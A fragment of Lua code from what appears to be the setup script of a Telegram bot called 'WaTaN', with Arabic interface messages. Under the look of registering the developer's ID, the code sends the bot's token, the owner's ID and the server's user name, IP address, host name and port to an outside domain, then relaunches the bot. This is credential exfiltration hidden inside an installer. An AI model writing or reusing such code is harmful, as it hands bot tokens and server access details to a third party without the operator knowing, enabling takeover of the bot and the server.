...
data,res = https.request("https://abbas.watanteam.tk/WaTaN/insert/index.php?bn=WaTaN&id="..SUDOID)
if res == 200 then
...
local t = json:decode(https.request('https://abbas.watanteam.tk/WaTaN/insert/index.php?n=WaTaN&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
else
io.write('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉≫ٴ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
end  
os.execute('lua WaTaN.lua')
end 
end
